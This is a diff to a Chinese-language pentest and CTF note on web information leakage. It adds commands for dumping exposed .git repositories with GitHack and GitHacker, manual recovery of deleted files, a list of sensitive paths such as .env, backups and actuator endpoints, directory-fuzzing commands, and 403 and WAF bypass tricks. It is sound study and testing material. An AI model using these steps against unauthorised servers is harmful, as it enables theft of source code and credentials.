@@ -51,10 +51,161 @@
 3. 报错触发：传非法参数、超长输入、类型错误，看是否回显堆栈
 4. 指纹联动：识别出 Spring 就测 actuator，识别出 PHP 就测 phpinfo 和 `.swp`
 
+## .git 泄露恢复实操
+
+前提：`/.git/HEAD` 返回 `ref: refs/heads/master` 之类内容，说明仓库结构在线。三种姿势从快到全，按需选择。
+
+### 1. GitHack（快速验证够用）
+
+```bash
+# 用法：URL 指向 .git 目录，工具按已知文件名递归下载并还原工作区
+python GitHack.py http://target/.git/
+
+# 结果保存在以目标域名命名的目录中，可直接翻源码
+# 局限：只能恢复当前 HEAD 指向的版本，历史提交 / stash / 已删除文件拿不到
+```
+
+### 2. GitHacker（推荐，可恢复完整历史）
+
+```bash
+# 拉取全部 objects（松散对象 + pack 打包对象），输出到 result 目录
+python githacker.py --output-dir result http://target/.git/
+
+# 进入恢复出的仓库
+cd result/target
+
+# 查看全部提交（含 HEAD 之外的游离提交）
+git log --all
+
+# 翻 stash：开发调试现场常直接藏着密钥 / 内网地址
+git stash list
+
+# 切到任意历史版本，找回"已删除"的敏感文件
+git checkout <commit-hash>
+```
+
+实战要点：CTF 常把 flag 放在历史版本里被删除的文件中，`git log --all` 定位删除前的 commit 再 `git checkout` 过去即可；`git diff HEAD^ HEAD` 直接看最近一次改动。
+
+### 3. 手工分析（工具失灵时兜底）
+
+```bash
+# ① 解析 .git/index：无需完整仓库，拿到 index 文件即可读出文件清单 + 每个文件的 SHA-1
+git ls-files -s
+# 输出形如：
+# 100644 3b18e512dfd84f50c1e4d0e5b1a2b3c4d5e6f7a8 0    application/config/database.php
+
+# ② 按 SHA-1 定位对象
+#    松散对象：.git/objects/<sha1 前 2 位>/<sha1 后 38 位>（zlib 压缩）
+#    打包对象：.git/objects/pack/*.pack（GitHacker 会自动解开）
+
+# ③ 手动解压单个松散对象（git 命令不可用时）
+python -c "import zlib,sys;d=open('objects/3b/18e512...','rb').read();sys.stdout.buffer.write(zlib.decompress(d))"
+
+# ④ 按时间戳恢复删除文件的思路：
+#    git fsck --lost-found    # 列出 dangling（游离）的 blob / commit
+#    git show <blob-hash>     # 逐个翻内容，定位被删掉的敏感文件
+#    git cat-file -p <hash>   # 查看任意对象的原始内容
+```
+
+常见坑：
+- 服务器对 `.git/` 目录 403（禁止列目录）不影响利用——工具是按已知文件名硬猜的
+- 部分环境 `.git/index` 可读但 objects 目录被拦，此时只能拿到文件名清单，走 ③ 手动解
+- 恢复完重点翻：`config`、`.env`、`*.sql`、`web.xml`、历史 diff、stash
+
 ## 工具
 - 目录扫描：dirsearch、ffuf、dirmap（配合 [PEN-Scanner](../penetration/PEN-Scanner.md)）
 - Git 利用：GitHack、GitHacker、git-dumper
 - 备份扫描：常见后缀字典 `bak/backup/swp/swo/old/zip/tar.gz/sql`
+
+### 探测路径字典
+
+常用泄露路径清单（30+ 条，按目标技术栈裁剪后喂给 fuzz 工具）：
+
+```text
+# 版本控制
+/.git/HEAD
+/.git/config
+/.svn/entries
+/.svn/wc.db
+/.hg/store/data
+/.bzr/checkout
+
+# 环境 / 配置
+/.env
+/.env.bak
+/.env.save
+/web.config
+/WEB-INF/web.xml
+/WEB-INF/classes/application.yml
+/application.yml
+/application.properties
+/bootstrap.properties
+/config.php.bak
+/.htaccess
+
+# 备份 / 压缩包 / 数据库导出
+/www.zip
+/backup.zip
+/backup.tar.gz
+/source.zip
+/db.sql
+/backup.sql
+/database.sql
+/index.php.bak
+/index.php~
+/index.php.swp
+/admin.php.bak
+
+# IDE / 编辑器 / 系统残留
+/.idea/workspace.xml
+/.idea/config.xml
+/.vscode/sftp.json
+/.project
+/.DS_Store
+/Thumbs.db
+
+# 接口文档
+/swagger-ui.html
+/swagger-ui/
+/v2/api-docs
+/v3/api-docs
+/doc.html
+/api-docs
+/graphql
+
+# Java 运维 / 监控
+/actuator
+/actuator/env
+/actuator/heapdump
+/actuator/mappings
+/actuator/configprops
+/druid/index.html
+/console
+
+# 调试 / 信息收集
+/phpinfo.php
+/info.php
+/test.php
+/server-status
+/robots.txt
+/crossdomain.xml
+/.well-known/security.txt
+```
+
+### fuzz 工具
+
+```bash
+# ffuf：FUZZ 标记字典注入点，-fc 过滤状态码，-t 并发线程，-r 递归扫描
+ffuf -w dict.txt -u https://target.com/FUZZ -fc 404 -t 50 -r -recursion-depth 2
+
+# dirsearch：-e 批量追加扩展名（自动组合出 index.php.bak 之类的候选）
+dirsearch -u https://target.com -e php,bak,zip,tar.gz,sql,txt,html -t 30
+
+# feroxbuster：Rust 实现、速度快，-s 只保留指定状态码，--depth 控制递归深度
+feroxbuster -u https://target.com -w dict.txt -s 200,204,301,302,403 --depth 2
+```
+
+提示：403 ≠ 放弃，`/.git/config` 403 时换大小写、双斜杠、`%2e` 编码、路径末尾补空格再试；有 WAF 时对字典路径做编码混淆。
 
 ## 利用链示例（CTF 常见）
 
@@ -71,3 +222,5 @@
 
 ## 参考
 - [OWASP - Information Leakage](https://owasp.org/www-community/vulnerabilities/Information_Leakage)
+- [GitHack - GitHub](https://github.com/lijiejie/GitHack)
+- [GitHacker - GitHub](https://github.com/WangYihang/GitHacker)
